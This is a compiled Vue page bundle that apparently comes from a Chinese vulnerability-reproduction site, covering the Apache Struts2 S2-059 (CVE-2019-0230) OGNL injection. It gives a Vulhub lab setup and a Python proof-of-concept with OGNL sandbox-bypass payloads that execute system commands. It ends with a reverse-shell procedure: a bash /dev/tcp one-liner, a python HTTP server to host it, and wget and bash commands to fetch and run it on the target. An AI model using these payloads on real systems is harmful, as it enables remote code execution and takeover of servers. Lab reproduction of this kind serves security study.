import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as l,c,a as e,b as a,d as s,e as t}from"./app-58e4a7d6.js";const r={},p=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),d=e("p",null,"Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。",-1),u=e("p",null,"参考链接：",-1),h={href:"https://cwiki.apache.org/confluence/display/WW/S2-059",target:"_blank",rel:"noopener noreferrer"},m={href:"https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776",target:"_blank",rel:"noopener noreferrer"},g=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: Struts 2.0.0 - Struts 2.5.20</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动Struts 2.5.16 s2-059测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动环境之后访问<code>http://your-ip:8080/?id=1</code> 就可以看到测试界面</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021353597.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9),v={href:"https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776",target:"_blank",rel:"noopener noreferrer"},b=t(`<p>通过如下Python脚本复现漏洞：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">&quot;http://192.168.174.128:8080&quot;</span>
data1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#39;&#39;)).(#ognlUtil.setExcludedPackageNames(&#39;&#39;))}&quot;</span>
<span class="token punctuation">}</span>
data2 <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;touch /tmp/awesome_poc&#39;))}&quot;</span>
<span class="token punctuation">}</span>
res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
<span class="token comment"># print(res1.text)</span>
res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
<span class="token comment"># print(res2.text)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行poc之后，进入容器发现<code>touch /tmp/awesome_poc</code>已成功执行。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021356602.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021358216.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function k(x,_){const n=i("ExternalLinkIcon");return l(),c("div",null,[p,d,u,e("ul",null,[e("li",null,[e("a",h,[a("https://cwiki.apache.org/confluence/display/WW/S2-059"),s(n)])]),e("li",null,[e("a",m,[a("https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776"),s(n)])])]),g,e("p",null,[a("《"),e("a",v,[a("OGNL Apache Struts exploit: Weaponizing a sandbox bypass (CVE-2018-11776)"),s(n)]),a("》给出了绕过struts2.5.16版本的沙盒的poc，利用这个poc可以达到执行系统命令。")]),b])}const S=o(r,[["render",k],["__file","Struts2 S2-059 远程代码执行漏洞 CVE-2019-0230.html.vue"]]);export{S as default};
